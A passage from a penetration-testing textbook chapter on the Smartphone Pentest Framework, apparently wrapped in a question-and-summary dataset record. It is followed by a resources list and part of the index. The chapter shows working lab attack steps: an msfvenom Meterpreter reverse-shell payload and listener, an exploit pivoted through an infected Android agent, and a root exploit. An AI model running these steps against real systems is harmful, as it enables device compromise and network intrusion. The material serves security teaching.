scripts for this and other supporting\ntools. Choose option 10.) Install Stuff from the main menu, and tell SPF to\ninstall Nmap for Android, as shown in Listing 20-20. spf> 10\nWhat would you like to Install? 1.) Android SDKS\n2.) Android APKTool\n3.) Download Android Nmap\nspf> 3\nDownload Nmap for Android(y/N)? spf> y\nListing 20-20: Installing Nmap for Android\nNow to run Nmap from our Android agent using option 12.) Run Nmap. Let’s run Nmap against our Windows XP target u, as shown in Listing 20-21. Make sure that the War-FTP program we exploited in Chapters 17 and 18\nis still running. (We’ll exploit it through the pivot in the next section.)\nUsing the Smartphone Pentest Framework 467\nSelect a command to perform or 0 to return to the previous menu\nspf> 12\nDownload Nmap and port scan a host of range. Use any accepted format for\ntarget specification in Nmap\nNmap Target: 192.168.20.10u\nDelivery Method(SMS or HTTP) HTTP\nListing 20-21: Running Nmap from Android\nLet Nmap run for a couple of minutes, and then check your agent’s\ngathered information. You should notice that the File field links to /root/\nSmartphone-Pentest-Framework/frameworkconsole/text.txt. View the contents of\nthis file—you should see something similar to Listing 20-22. # Nmap 5.61TEST4 scan initiated Sun Sep 6 23:41:30 2015 as: /data/data/com.example.android.google\n.apis/files/nmap -oA /data/data/com.example.android.google.apis/files/nmapoutput 192.168.20.10\nNmap scan report for 192.168.20.10\nHost is up (0.0068s latency). Not shown: 992 closed ports\n\nPORT STATE SERVICE\n21/tcp open ftp\n--snip--\n# Nmap done at Sun Sep 6 23:41:33 2015 -- 1 IP address (1 host up) scanned in 3.43 seconds\nListing 20-22: Nmap results\nRather than run an entire pentest using the exploited mobile device as\na pivot, let’s finish by running an exploit through the SPF agent. Exploiting a System on the Local Network\nUnfortunately, Android devices don’t know scripting languages such\nas Python and Perl by default; to run an exploit, we need some C code. A simple C version of the exploit we wrote for War-FTP 1.65 in Chapter 17\nis in /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c. The included shellcode runs a windows/meterpreter/reverse_tcp payload and\nsends it back to 192.168.20.9 on port 4444. If your Kali system is at another\nIP address, regenerate the shellcode with Msfvenom, as shown here. (Don’t\nforget the bad characters for War-FTP from Chapter 17. We can avoid them\nwith Msfvenom using the -b flag.)\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 -f c -b '\\x00\\x0a\\x0d\\x40'\nOnce you’ve replaced the shellcode in the exploit, if necessary, we need\nto compile the C code to run on an Android device. If we use GCC, as in\nChapter 3, the exploit will run fine from our Kali box, but the ARM proces-\nsor on our Android phones won’t know what to make of it. We briefly ran into cross compilers for Windows in Chapter 12 that\nallowed us to compile C code on Kali to run on Windows. We can do the\n468 Chapter 20\nsame thing for Android as long as we have an ARM cross compiler. Luckily,\nSPF has one. As shown in Listing 20-23, choose option 9.) Compile code to\nrun on mobile devices from the main menu. spf> 9\nCompile code to run on mobile devices\n1.) Compile C code for ARM Android\nspf> 1u\nCompiles C code to run on ARM based Android devices. Supply the C code file and the output\nfilename\nFile to Compile: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.cv\nOutput File: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter\nListing 20-23: Compiling C code to run on Android\nSelect 1.) Compile C code for ARM Android u. You will be prompted for the\nC file to compile as well as where you want to put the compiled binary v. Now we need to download the War-FTP exploit to our infected Android\ndevice. From the agent commands menu, choose option 6 to download a\nfile. You will be asked for the file to download and the delivery method, as\nshown in Listing 20-24. Select a command to perform or 0 to return to the previous menu\nspf> 6\nDownloads a file to the phone. Fill in the file and the delivery method(SMS or HTTP). File to download: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter\nDelivery Method(SMS or HTTP): HTTP\nListing 20-24: Downloading the exploit\nBefore we run the exploit, we need to set up a handler in Msfconsole,\nas shown in Listing 20-25. Open Msfconsole on Kali, and use the multi/\nhandler module, setting the options to match the payload in the War-FTP\nexploit. msf > use multi/handler\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Starting the payload handler... Listing 20-25: Setting up multi/handler\nFinally, it’s time to run the exploit. As shown in Listing 20-26, choose\noption 7.) Execute Command from the agent commands menu; you will be\nprompted for the command to run. Using the Smartphone Pentest Framework 469\nSelect a command to perform or 0 to return to the previous menu\nspf> 7\nRun a command in the terminal. Fill in the command and the delivery\nmethod(SMS or HTTP). Command: warftpmeterpreter 192.168.20.10 21u\nDownloaded?: yesv\nDelivery Method(SMS or HTTP): HTTP\nListing 20-26: Running the exploit\nTell SPF the full command, including arguments u. In this case, we\nneed to tell the exploit the IP address and port to attack. SPF asks if the\nbinary was downloaded. If it was downloaded through SPF, it will be in the\nagent’s files directory, and SPF will need to know to run it from there. In\nour case, we answer yes v, then enter the delivery method as usual. Watch your Metasploit listener. In about a minute you should receive a\nMeterpreter prompt like the one shown next. meterpreter >\nWe’ve successfully used SPF as a pivot to run an attack. This may not\nseem very exciting because the emulator, Kali, and the Windows XP target\nare all on the same network, but if Kali is in the cloud and the Windows XP\ntarget and an infected Android device are on the corporate network, this\nprocess would be more useful. We can make it more interesting by using\ncommand option 10.) TCP Listener to set up a listener to catch our shell on\nthe infected mobile device. Rather than calling back out to a listener on our\nKali machine, we can instead send our shell back to SPF directly using either\nHTTP or SMS. Using SMS will, of course, allow us to completely bypass any\nperimeter filtering such as firewalls and proxies that may inhibit getting\nshells out of the network from your attacks. This is illustrated in Figure 20-5. attacker-controlled\nphone\nattacker\ncomputer\nInternet\ncell\ntower(s)\nlocal router\n(bypassed)\nlocal\nexploited PC\nlocal infected\nphone\nFigure 20-5: Bypassing perimeter controls with an SMS-based shell. 470 Chapter 20\nnote Aside from the privilege escalation example discussed next, there is no reason we\nneeded to use Android 2.2 as our target emulator. The other malicious app examples\nwe have used in this chapter will work on any version of Android. Privilege Escalation\nAs a forked Linux kernel, Android shares some of Linux’s privilege escala-\ntion vulnerabilities, as well as having a few security mistakes of its own. Even\nOEMs have added bugs into their implementations of Android. For example,\nin 2012, a privilege-escalation vulnerability was found in how Samsung\ndevices handled the camera memory if they used a certain kind of chip, giv-\ning attackers read/write access to all of memory. If you want more permissions granted to your app, you can attempt to use\na known issue from the agent to get root privileges, as shown in Listing 20-27. Commands:\n--snip--\nSelect a command to perform or 0 to return to the previous menu\nspf> 5\n1.) Choose a Root Exploit\n2.) Let SPF AutoSelect\nSelect an option or 0 to return to the previous menu\nspf> 2u\nTry a privilege escalation exploit. Chosen Exploit: rageagainstthecagev\nDelivery Method(SMS or HTTP): HTTPw\nListing 20-27: Running a privilege-escalation exploit\nFrom the agent commands menu, choose option 5.) Privilege Escalation. From here we have two options. We can manually choose an exploit from\nthe exploits for Android that SPF knows, or we can let SPF make a selection\nbased on the Android version number. Our Android 2.2 emulator is vulner-\nable to an exploit known as Rage Against the Cage. Though this is an older\nexploit, it works well on the emulator, so let’s allow SPF to automatically\nselect the exploit, as shown at u. Because this is Android 2.2, SPF correctly\nselects rageagainstthecage v and asks for the delivery method w. After giving the exploit a little time to run, check back with option 3\nfrom the main menu. The Rooted field should read RageAgainstTheCage, as\nshown here. Rooted: RageAgainstTheCage\nFrom here we have full control of the device. We can issue commands\nfrom a root shell or reinstall the agent as a system app, giving us even more\nprivileges than the original app. Using the Smartphone Pentest Framework 471\nnote This particular exploit is a resource exhaustion attack, so if you want to continue\nusing the emulator for additional exercises, you may want to restart it, as it may per-\nform slower after this attack. summary\nIn this chapter, we took a brief look at the relatively new and rapidly evolving\nworld of mobile exploitation. We used my SPF tool to run a variety of attacks,\nprimarily on emulated Android mobile devices. These attacks will, of course,\nwork on real devices in the same way. We looked at a remote attack that\nchecked for a default SSH password on jailbroken iPhones, and then studied\ntwo client-side attack examples. One gave us a shell through a WebKit vulner-\nability in the browser, and the other remotely controlled the device through\nUSSD codes that were automatically dialed from a web page. We moved on to malicious applications, backdooring legitimate source\ncode or compiled APK files with the SPF Android agent. We can use mobile-\nattack vectors such as NFC and SMS to trick users into installing our mali-\ncious app. Once the agent was installed, we ran attacks such as information\ngathering and remote control, and we used SPF to escalate our privileges to\nroot using known vulnerabilities in the Android platform. Finally, we used\nthe SPF agent as a pivot to attack other devices in the network. We ran\nNmap from the Android device against our Windows XP target, and then\nused a C exploit for War-FTP to exploit the Windows XP target from the\nSPF agent. Mobile device security is an exciting field that is adding new dimensions\nto pentesting as the devices enter the workplace. As a pentester, knowing a\nbit about mobile vulnerabilities will come in handy. As attackers use these\ndevices to gain sensitive data and a foothold in the network, pentesters must\nbe able to simulate these same threats. 472 Chapter 20\nresourCes\nHere are some resources that have helped me on my\njourney through information security and continue to\nserve as references as I learn more. Many are regularly\nupdated with the latest tools and techniques in their\narea. I encourage you to refer to these resources as you\nwork through this book, so they are listed here by chap-\nter. At the end of the list are some excellent courses that\nyou might use to further your study of pentesting. Chapter 0: Penetration Testing Primer\n• NIST Technical Guide to Information Security Testing: http://csrc.nist\n.gov/publications/nistpubs/800-115/SP800-115.pdf\n• Penetration Testing Execution Standard (PTES): http://www.pentest\n-standard.org/\nChapter 2: Using Kali Linux\n• Command Line Kung Fu: http://blog.commandlinekungfu.com\n• Introduction to the Command Line (Second Edition): The Fat Free Guide to\nUnix and Linux Commands by Nicholas Marsh (2010)\n• The Linux Command Line: A Complete Introduction by William E. Shotts, Jr. (No Starch Press, 2012)\n• Linux for Beginners and Command Line Kung Fu (Bundle): An Introduction\nto the Linux Operating System and Command Line by Jason Cannon (2014)\nChapter 3: Programming\n• Discovery: https://github.com/leebaird/discover/\n• Stack Overflow: http://www.stackoverflow.com/\n• Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers\nand Security Engineers by T.J.",
    "question": "What is the Smartphone Pentest Framework (SPF) and how does it help in assessing the security of mobile devices?",
    "summary": "This chapter discusses mobile device exploitation, focusing on the Smartphone Pentest Framework (SPF). It covers various attack methods, including remote and client-side attacks, and explains how SPF can be used to create and deploy malicious apps. The chapter also explores how SPF can be used to escalate privileges and pivot to attack other devices on a network. Additionally, it highlights the importance of understanding mobile security features like ASLR, DEP, and mandatory code signing, which help in mitigating attacks on mobile platforms. Finally, it provides an overview of mobile device security challenges and the role of pentesters in assessing and mitigating these risks."
  },
  {
    "start": 129,
    "end": 133,
    "text": "O’Connor (Syngress, 2012)\nChapter 4: Using the Metasploit Framework\n• Metasploit: The Penetration Tester’s Guide by David Kennedy, Jim O’Gorman,\nDevon Kearns, and Mati Aharoni (No Starch Press, 2011)\n• Metasploit blog: https://community.rapid7.com/community/metasploit/blog/\n• Metasploit Minute show: http://hak5.org/category/episodes/metasploit-minute/\n• Metasploit Unleashed: http://www.offensive-security.com/metasploit-unleashed/\nMain_Page\nChapter 5: Information Gathering\n• Google Hacking Database: http://www.hackersforcharity.org/ghdb/\n• Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery\nand Security Scanning by Gordon Fyodor Lyon (Nmap Project, 2009;\nhttp://nmap.org/book/)\nChapter 6: Finding Vulnerabilities\n• National Vulnerability Database CVSSv2: http://nvd.nist.gov/cvss.cfm/\n• Tenable blog: http://www.tenable.com/blog/\nChapter 7: Capturing Traffic\n• Counter Hack Reloaded: A Step-by-Step Guide to Computer Attacks and\nEffective Defenses (2nd Edition) by Edward Skoudis and Tom Liston\n(Prentice Hall, 2006)\n474 Resources\n• Ettercap: http://ettercap.github.io/ettercap/\n• SSLStrip: http://www.thoughtcrime.org/software/sslstrip/\nChapter 8: Exploitation\n• Exploit Database: http://www.exploit-db.com/\n• Packet Storm: http://packetstormsecurity.com/\n• SecurityFocus: http://www.securityfocus.com/\n• VulnHub: http://vulnhub.com/\nChapter 9: Password attacks\n• CloudCracker: https://www.cloudcracker.com/\n• John the Ripper: http://www.openwall.com/john/\n• Packet Storm wordlists: http://packetstormsecurity.com/Crackers/wordlists/\n• RainbowCrack Project: http://project-rainbowcrack.com/table.htm\n• White Chapel: http://github.com/mubix/WhiteChapel/\nChapter 11: Social Engineering\n• Social-Engineer: http://www.social-engineer.org/\n• TrustedSec: https://www.trustedsec.com/downloads/social-engineer-toolkit/\nChapter 12: Bypassing antivirus applications\n• Pentest Geek: http://www.pentestgeek.com/2012/01/25/\nusing-metasm-to-avoid-antivirus-detection-ghost-writing-asm/\n• Veil-Evasion: https://github.com/Veil-Framework/Veil-Evasion/\nChapter 13: Post Exploitation\n• Chris Gates’s blog, carnal0wnage: http://carnal0wnage.attackresearch.com/\n• Carlos Perez’s blog: http://www.darkoperator.com/\n• Obscuresec blog: http://obscuresecurity.blogspot.com/\n• Pwn Wiki: http://pwnwiki.io/\n• Rob Fuller’s blog: http://www.Room362.com/\nChapter 14: Web application Testing\n• Damn Vulnerable Web App: http://www.dvwa.co.uk/\nResources 475\n• Open Web Application Security Project (OWASP): https://www.owasp.org/\nindex.php/Main_Page\n• OWASP WebGoat Project: https://www.owasp.org/index.php/Category\n:OWASP_WebGoat_Project\nChapter 15: Wireless attacks\n• Aircrack Wireless Tutorials: http://www.aircrack-ng.org/doku.php?id=tutorial\n&DokuWiki=1b6b85cc29f360ca173a42b4ce60cc50\n• BackTrack 5 Wireless Penetration Testing Beginner’s Guide by Vivek\nRamachandran (Packt Publishing, 2011)\nChapters 16–19: Exploit Development\n• Corelan Team Tutorials: https://www.corelan.be/index.php/category/\nsecurity/exploit-writing-tutorials/\n• FuzzySecurity: http://fuzzysecurity.com/\n• Hacking, 2nd Edition: The Art of Exploitation by Jon Erickson (No Starch\nPress, 2008)\nChapter 20: Using the Smartphone Pentest Framework\n• Damn Vulnerable iPhone App: https://github.com/prateek147/DVIA/\n• Drozer: https://www.mwrinfosecurity.com/products/drozer/\n• OWASP mobile: https://www.owasp.org/index.php/OWASP_Mobile_\nSecurity_Project\nCourses\n• Strategic Security (Joe McCray): http://strategicsec.com/\n• Offensive Security: http://www.offensive-security.com/information\n-security-training/\n• Exploit Development Bootcamp (Peter Van Eeckhoutte): https://www\n.corelan-training.com/index.php/training-2/bootcamp/\n• Sam Bowne: http://samsclass.info/\n• SecurityTube PentesterAcademy: http://www.pentesteracademy.com/\n476 Resources\ninDex\nNumbers and Symbols Aircrack-ng\ncracking WEP keys with, 347–350\n3Com TFTP 2.0.1\ncracking WPA/WPA2 keys with,\ndownloading and installing, 42–43\n353–356\npublic exploit for transport mode\nAireplay-ng\nvulnerability, 427–429\nto force client reconnection, 354\n3CTftpSvc process, attaching, 424–425\nrebroadcasting ARP packets\n3CTftpSvc.exe, 295\nwith, 348\n7-Zip programs, 10\nairmon-ng check kill command, 342\n& (ampersand), for running commands\nAirmon-ng script, 341–342\nin browser, 328\nairodump-ng command, 342–343, 347\n\\\\ (double backslashes), for escape, 186\nall users, permissions for, 62\n> symbol, for redirecting input, 61\nampersand (&), for running commands\n>> operator, 61, 81\nin browser, 328\n#include command (C), 84\nAndroid, 456\n| (pipe), 65\nemulators, 449\n/ (slash), as delimiter character in\nsetting up, 22–27\nsed, 65\nstarting, 26–27\nrelationship with security\na\nupdates, 457\nabsolute path, 56 scripting languages vs.\n\nC code, 468\nAddress Resolution Protocol (ARP) SDK manager, 23\nbasics, 161–163 software\naddress space layout randomization building, 449–450\n(ASLR), 364, 440 deploying, 450–451\nadduser command, 58–59, 309 installing, 24\nadministrative privileges Virtual Device Manager, 24–25\ngaining to control domain, 296 Android Master Key vulnerability, 459,\nfor Windows 7 applications, 285 462–463\nAdministrator password, for anonymous user, on Windows XP\nWindows, 33 target, 157\nAdobe Acrobat Reader, 225–226 antivirus application avoidance,\ninstalling, 46 257–275\nAdvanced Execution Standard hiding in plain sight, 274\n(AES), 269 Microsoft Security Essentials,\nAdvanced Packaging Tool (apt), 66 261–262\nantivirus application avoidance B\n(continued)\nbackdoored code, 458–461\npayload hiding, 263–274\ntesting from, 193–194\nRailgun, 283\nbackground command (Meterpreter), 311\ntrojans, 258–259\nbackground job, killing in\nwith Veil-Evasion, 270–274\nMetasploit, 222\nVirusTotal, 262–263\nBackTrack Linux, 55\nantivirus applications\nbar codes, QR (quick response)\nhow they work, 260–261\ncodes, 447\nsignatures for, 438\nBash command processor, 56\nantivirus definitions, 260\nBash scripts, 75–81\nApache server\nelse statement in, 78\ndefault “It Works” page, 169–170\nfor loop in, 78–79\ninstalling, 44\nif statement in, 77–78\nAPK file, 461–464\npinging hosts on network with, 76\nAPKTool, installing, 462\nrunning, 77\nappending text to file, 61\nstreamlining results, 79–81\napt (Advanced Packaging Tool), 66\nthen statement in, 78\nargument string, Perl for creating, 376\n.bash_history file, 295–296\nARP (Address Resolution Protocol)\nBeEF (Browser Exploitation\nbasics, 161–163\nFramework), 331–335\nARP cache poisoning, 160–166\nbind payload, 307\nwith Arpspoof, 164–165\nbind shell payload, 102–103\nas bottleneck, 166\nbind shells, 71, 98, 180\nimpersonating default gateway\nbitwise XOR operation, 344\nwith, 165–166\nBkhive, 205\nARP request\nBlackboard, Java for, 241\ngenerating, 349\nBookApp custom web application\nrelay attack, generating IVs with,\nattacking, 313–337\n348–349\ninstalling, 53–54\nArpspoof, ARP cache poisoning with,\nbooting\n164–165\nKali Linux, 11\nASLR (address space layout\nvirtual machine delay in, 207\nrandomization), 364, 440\nbootkey, 189, 205\nassembly instructions, converting to\nbreakpoints in program, 368\nshellcode, 398–399\nrunning program to next, 370\nAtftpd TFTP server, 187\nsetting, 393\nattack string, finding in memory,\nbridged network, for VMware\n408–411\nconnection, 13, 14, 16, 31, 48\nAurora exploit, 220–222\nBrowser Exploitation Framework\nauthentication, fake, 347–348\n(BeEF), 331–335\nauthorization, for penetration test, 3\nbrowser_autopwn module, 235–237\nautomatic security updates\nbrowsers\nopting out, in Windows 7, 50\n& for running commands in, 328\nturning off, 34\nattack for opening link in\nAutoRunScript parameter, for Metasploit,\nmobile, 455\n224–225\nautopwning, 237\nauxiliary/server/capture/smb\nexploitation, 219–225\nmodule, 302\nbrute forcing, 198\nawk command (sed), 66\nLM-hashed passwords, 208\nMD5 hashes, 212\n478 Index\nNTLM-hashed passwords, 210–211 clients\nuse in Hyperion, 269 Aireplay-ng to force\nWPS pin, 356–357 reconnection, 354\nbuffer overflow contact information for, 3\nin Linux, 364–378 exploiting vulnerability in, 88\npreventing exploits, 439–440 goals for pentest, 3\nin third-party software, exploiting, client-side attacks\n190–191 exploitation with, 218–239\nWar-FTP crash due to, 384 mobile hacking, 454–457\nin Windows, 379–400 clipboard (Windows), stealing data\nbugs, finding with code review, 422 from, 334\nBully, cracking WPS with, 357 closing\nBurp Proxy, web application testing handler, 228\nwith, 314–319 shell, 100\nBurp Repeater, 314 code review, finding bugs with, 422\nBurp Spider, 314 command line arguments, in C, 84\ncommand shell\nC opening listener, 70–71\npushing back to listener, 71–72\nC programs, 84–85\ncommands. See also specific commands\nfor Android devices, 468\nexecuting, 327–329\ncausing crash, 366–367\nlearning about, 57–58\nmemory use, 363–364\nCommon Vulnerabilities and\nvulnerability to stack-based buffer\nExposures (CVE)\noverflow, 365–366\nsystem, 142\nCA (certificate authority), 171\nCommon Vulnerability Scoring System\nCadaver, 150–151, 182\n(CVSS), 140\nCain and Abel for Windows, 304\ncompromised service, exploitation of,\nCain password tool, 303\n193–194\ncalling conventions, 390\ncomputer name, for Windows, 33\ncanaries, 440\nConficker worm, 90\ncapturing traffic, 155–175. See also\nconfiguration file\nWireshark\ncracking passwords, 212–213\nARP cache poisoning, 160–166\ndownloading, 188–189\nDNS cache poisoning, 167–169\nconnect function (Python), 83\nnetworking for, 156\nconnect_ex function (Python), 83\non wireless network, 342–343\nconnect_udp function, 435\ncat command, 61\ncontact information, for client, 3\ncat /etc/shadow command, 194\ncontinue command (GDB), 370\nCCMP (Counter Mode with Cipher\ncopying file, 60\nBlock Chaining Message\nCounter Mode with Cipher Block\nAuthentication Code\nChaining Message\nProtocol), 351\nAuthentication Code\ncd command, 56\nProtocol (CCMP), 351\nCERTCN option, 234\ncp command, 60\ncertificate, for Java applet, 234\nCPUs, registers in Intel-based,\ncertificate authority (CA), 171\n362–363\nceWL custom wordlist generator,\ncrashes, 151\n200–201\nattempting with fuzzing, 424–426\ncheck function, in Metasploit\ncausing, 382–384\nexploits, 147–148\nin GDB, 372–373\nchmod command, 62\nin War-FTP, 397–398, 403\nmaking script executable, 76\nIndex 479\nCRC-32 (Cyclic Redundancy default port, for Simple Mail Transfer\nCheck 32), 346 Protocol (SMTP), 124\nCreateThread API, 271 delegation token, 300–301\nCredential Harvester Attack Method, deleting\n251–252 files, 60\ncredentials, 174 final character from each line, sed\nbrute force to find, 198 command for, 81\nfor FTP server, 160 demilitarized zone, 304\ngathering, 292–294 denial-of-service (DoS) condition, 163\nin Nessus, 137 DEP (data execution prevention),\nstealing stored, 294 364, 441\ncron jobs deploying Android application, 450–451\nautomating tasks with, 72–73 Destination Host Unreachable message, 39\ncreating, 311 /dev/urandom file (Linux), 267\ncrontab files, 72 DHCP (dynamic host configuration\ncross-site request forgery (CSRF), 335 protocol), 68\ncross-site scripting (XSS), 329–335 dictionary attack, against WPA/\nchecking for reflective WPA2, 356\nvulnerability, 330 dictionary words, in passwords, 198\nleveraging with BeEF, 331–335 directories\nCrunch tool, 201 changing, 56–57\nCSRF (cross-site request forgery), 335 creating, 60\nCtypes library (Python), 271 displaying current, 56\ncustom cross compiling, 266–269 disass command (GDB), 370–371\ncut command, 65, 80 DNS. See Domain Name System (DNS)\nCVE (Common Vulnerabilities and DNS cache poisoning, 167–169\nExposures) system, 142 Dnsspoof, 169\nCVE-2008-2992, 225–228 documentation, 57.\n\nSee also man pages\nCVSS (Common Vulnerability Scoring domain\nSystem), 140 adding administrator account, 309\nCyclic Redundancy Check 32 getting administrative access to, 296\n(CRC-32), 346 setup for simulating, 39–40\ncyclical pattern, generating to users, password hashes for, 302\ndetermine offset, 385–388 Domain Name System (DNS)\nreconnaissance, 116–118\nD zone transfers, 117–118\ndomain names, resolution, 167\ndata execution prevention (DEP),\ndomain registrars, 115\n364, 441\nDoS (denial-of-service) condition, 163\ndata manipulation, in Kali Linux,\ndouble backslashes (\\\\), for escape, 186\n64–66\ndownloading\ndatabase\n3Com TFTP 2.0.1, 42–43\ndumping with SQLMap, 322\nKali Linux, 10\nexploiting access to, 188\npayload by users, 105\nfinding name of first, 321\nsensitive files, 188–189\nfor SPF, 448–449\nSLMail 5.5, 41–42\ndebugger, installing, 46\nSmartphone Pentest Framework\ndebugging information, for GDB, 366\n(SPF), 27–28\ndefault gateway, 68\nwith TFTP, 187–188\nARP cache poisoning for\nWar-FTP, 46\nimpersonating, 165–166\nWindows SAM, 189\nfinding, 38\nWinSCP, 46\ndefault payload, for Metasploit, 97\n480 Index\ndpkg command, 18 execute (x) permissions, 62\ndual-homed systems, 304 execution\ndynamic analysis, 261 hijacking as goal, 373\ndynamic host configuration protocol hijacking in Linux, 375–376\n(DHCP), 68 hijacking in Windows, 390–395\nexecutive summary of report, 5\nE exploit code, repositories of, 88\nexploit command (Metasploit), 97\nEAX register, 362, 403\nExploit Database, 88, 427\nEBP register, 362, 363, 369, 390\nexploit target, for Metasploit, 95\nEBX register, 362\nexploit/multi/browser/java_signed_applet\necho command, 61, 76\nmodule, 233–234\nECX register, 363\nexploitation, 179–196\nEDI register, 362, 390\nof buffer overflow in third-party\nediting files, 62–64\nsoftware, 190–191\nEDX register, 363\nwith client-side attacks, 218–239\nEIP register, 362, 363\nof compromised service, 193–194\ncontrolling, 373–375\nwith Java, 230–235\nlocating, 384–388\nmitigation techniques, 439–442\nverifying offset, 388–389, 390\nof MS08-067 vulnerability,\nelse statement, in Bash scripts, 78\n180–182\nemail\nof open NFS shares, 194–196\nsearching for addresses, 118–119\nphase of penetration testing, 2, 4\nsocial-engineering attacks\nof phpMyAdmin, 186–188\nwith, 244\nrunning through pivot, 306–307\nemulator, Android, 449\nof third-party web applications,\nsetting up, 22–27\n191–193\nstarting, 26–27\nof WebDav default credentials,\nencoders, 263–266\n182–183\nencryption key, for Syskey utility, 189\nExploit::Remote::UDP mixin, 435\nend, in Ruby, 434\nexploits\nendianness, 376–378, 394\nporting public, 427–432\nenterprise connection process, in\nreplacing shellcode, 430\nWPA/WPA2, 351\nrunning, 100\nescape, double backslashes (\\\\)\nrunning through SPF agent, 468\nfor, 186\nwith SEH overwrites, 403–407\nESI register, 362\nwriting, 361\nESP register, 362, 363, 390–391\nexploit/windows/fileformat/adobe_pdf_\nfollowing on stack, 408–409\nembedded_exe module, 228\n/etc/crontab file, 72–73, 311\nexploit/windows/fileformat/adobe_utilprintf\n/etc/john/john.conf file, 212\nmodule, 226\n/etc/network/interfaces file, 68–69\nexploit/windows/fileformat/winamp_maki_\n/etc/proxychains.conf configuration\nbof module, 238\nfile, 307\nexploit/windows/local/ms11_080_\nEttercap\nafdjoinleaf module, 284\ninstalling, 22\nexploit/windows/smb/psexec module, 296\nfor man-in-the-middle attacks, 171\nexploit/windows/tftp/tftpd32_long_\nexceptions. See structured exception\nfilename.rb module, 435\nhandler\nexternal penetration test, 2\nexecutables\nEz7z program, 10\nembedded in PDF, 228–229\nHyperion for encrypting, 269–270\nusing return address from, 394\nIndex 481\nF G\nFacebook, 172 GCC (GNU Compiler Collection), 84,\nfactory restore, 456 289, 366\nfake authentication, 347–348 gcc command, 289\nfile permissions, 61–62 GDB (GNU debugger), 366\nfilename for exploit, random crashing program in, 372–373\ncharacters for, 438 running, 367–372\nfiles viewing source code, 368\nadding text, 61 getsystem command (Meterpreter),\ncopying, moving, and removing, 60 283–286\ncreating, 60 getuid command (Meterpreter), 185,\nediting, 62–64 279, 281\nsearching for text in, 65 GNU Compiler Collection (GCC), 84,\nsending script results to, 81 289, 366\nviewing list of, 18 GNU debugger. See GDB (GNU\nFileZilla server.xml configuration file, debugger)\n188–189 Google Play apps, signature for, 462\nFileZilla services, installing, 44 Google search, on vulnerability, 142\nfilters, bypassing with Metasploit GoToMeeting, Java for, 241\npayloads, 216–218 grep command, 65\nfinding filtering script output, 80\nattack string in memory, 408–411 greppable Nmap, 125\ncompatible payloads, 96–97 group, permissions for, 62\nreturn address, 429–430 group transient key (GTK), 352\nvalid usernames, 153\nfirewalls, intrusion-detection and H\nprevention systems on, 125\nhandler, closing, 228\nfolders, sharing via FTP, 45\nHardware dialog, 31\nfor loop, in Bash scripts, 78–79\nhashdump command (Meterpreter), 204,\nformats, for Nmap log, 125\n205, 298\nfour-way handshake, 351, 352–353\nhashes\ncapturing, 354\nconverting to plaintext, 203\nWireshark for viewing, 355\nfor domain users, 302\nFramework Android App, 451\ndumping with physical access,\nFSTENV instruction, 398\n206–208\nFTP account, default password for, 213\nexample, 211\nFTP server\nLM vs.\n\nNTLM algorithms, 208\naccess to file on, 146–147\nrainbow table for precompleted, 213\nexploiting stack-based buffer\nrecovering from Windows SAM\noverflow in, 379–380\nfiles, 204–206\nlogging in to, 157, 165\nreversing, 203, 298\nFTP user, adding, 45\nheap in memory, 362\nfuturesoft_transfermode.rb module,\n“Hello World” C program, 84\n432–434\nhelp\nfuzzing, 421–426\nfor Meterpreter commands, 278\nattempting crash, 424–426\nfor Msfcli, 101\nfinding bugs with code review, 422\nfor Msfconsole, 89–90\nfor trivial FTP server, 422–423\nhelp upload command (Meterpreter), 279\nhidden directories, ls command to\nshow, 57–58\n482 Index\nhook.js script (BeEF), 332–333 installed packages, managing, 66\nhost utility for DNS queries, 117 installing\nhost-only network, 13, 117 3Com TFTP 2.0.1, 42–43\nHTML, for attack email, 254 Adobe Acrobat Reader, 46\nHTTP GET request, capture by Burp Android emulators, 22–27\nProxy, 316 Apache, 44\nHTTP payload, 217–218 APKTool, 462\nexploiting Java vulnerability with, debugger, 46\n231–232 Ettercap, 22\nHTTPS, 174 FileZilla services, 44\npayloads, 217–218 Hyperion, 21, 270\nhub, and traffic capture, 156 Immunity Debugger, 46–47\nHydra, guessing usernames and Java 7 Update 6, 52\npasswords with, 202–203 Microsoft Security Essentials, 52\nHyperion Ming C Compiler, 20\nencrypting executables with, Mona, 47\n269–270 Mozilla Firefox, 52\ninstalling, 21, 270 MySQL, 44\nNessus, 17–20\nI Python, 46\nSLMail 5.5, 41–42\nIceweasel browser, proxy configuration,\nSmartphone Pentest Framework\n315–316\n(SPF), 27–28\nICMP (Internet Control Message\nVeil-Evasion, 21\nProtocol) message, 76\nVMware, 9–10\nif statement\nvulnerable software, 40–47\nBash, 77–78\nWar-FTP, 46\nC, 84\nWinamp version 5.55, 52\nPython, 83\nWinSCP, 46\nifconfig command, 16, 67, 304–305\nXAMPP 1.7.2, 43–45\nIIS (Internet Information Services),\nIntel-based CPU registers, 362–363\nuser privileges, 329\ninternal penetration test, 2\nImmunity Debugger, 381–382\nInternet access, testing for Kali\ninstalling, 46–47\nLinux, 17\n#include command (C), 84\nInternet Control Message Protocol\nIncognito tool, 301–302\n(ICMP) message, 76\nincoming connection, listening on port\nInternet Explorer, vulnerability,\nfor, 70\n220–222\ninfo command (Metasploit), 92–93\nInternet Information Services (IIS),\ninformation-gathering phase of\nuser privileges, 329\npenetration testing, 2, 4,\nInternet Protocol (TCP/IP) Properties\n113–132\ndialog, 39\nlocal, 291–296\niOS, approach to preventing malicious\non mobile device, 464–465\ncode, 441\nopen source intelligence (OSINT),\nIP address, 67–68\n114–123\nDNS mapping to, 167–168\ninitialization vector (IV), 344\nmapping to MAC address, 161\ngenerating with ARP request relay\nsetting static, 38–39\nattack, 348–349\nverifying, 16\ninline payloads, 181\nIP forwarding, 163–164\ninput, > symbol for redirecting, 61\nipconfig command, 38\ninput function (Python), 82\noutput from, 328\ninsert mode for vi, 64\nIndex 483\niPhone Incognito tool, 301–302\ndefault SSH login, 453–454 PSExec technique, 296–297\njailbreaking, 219, 441 SMB capture, 